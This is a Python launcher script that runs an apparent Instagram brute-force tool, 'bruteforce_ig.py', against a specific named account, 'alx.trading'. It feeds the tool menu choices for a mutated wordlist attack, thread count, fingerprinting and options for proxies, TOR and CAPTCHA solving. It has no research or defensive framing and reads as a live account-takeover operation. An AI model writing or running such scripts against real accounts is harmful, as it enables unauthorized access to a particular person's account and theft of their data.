#!/usr/bin/env python3
"""
Option 1 Attack: Enhanced wordlist + smart generation + mutations
Target: alx.trading
"""

import os
import sys
import subprocess


def main():
    print("💀 OPTION 1 ATTACK - ENHANCED WORDLIST + MUTATIONS")
    print("🎯 Target: alx.trading")
    print("📋 Mode: Enhanced wordlist + smart generation + mutations")
    print("=" * 60)

    # Create input sequence for option 1
    inputs = [
        "alx.trading",  # Target username
        "y",            # User exists confirmation
        "1",            # Option 1: Enhanced wordlist + smart generation + mutations
        "5",            # Max threads (low for testing)
        "n",            # No proxies (to avoid IPv6 issues)
        "n",            # No Selenium
        "n",            # No TOR
        "n",            # No async
        "y",            # Smart mode ON
        "y",            # Advanced fingerprinting ON
        "n",            # No CAPTCHA solving
        "n",            # No network scan
        "",             # Press ENTER to start attack
    ]

    input_string = "\n".join(inputs) + "\n"

    try:
        print("🚀 Starting Option 1 attack...")
        print("⚙️  Configuration:")
        print("   📋 Enhanced wordlist + smart mutations")
        print("   🧵 5 threads")
        print("   🌐 No proxies")
        print("   🧠 Smart mode enabled")
        print("   🎭 Advanced fingerprinting enabled")
        print()

        # Run the main brute force script with our inputs
        process = subprocess.Popen(
            [sys.executable, "bruteforce_ig.py"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            cwd="/workspaces/sugarglitch-realops/scripts"
        )

        # Send inputs and capture output
        try:
            output, _ = process.communicate(input=input_string, timeout=120)
            print(output)
        except subprocess.TimeoutExpired:
            print("⏰ Attack is still running...")
            process.kill()
            output, _ = process.communicate()
            print(output)

    except Exception as e:
        print(f"❌ Error running Option 1 attack: {e}")


if __name__ == "__main__":
    main()
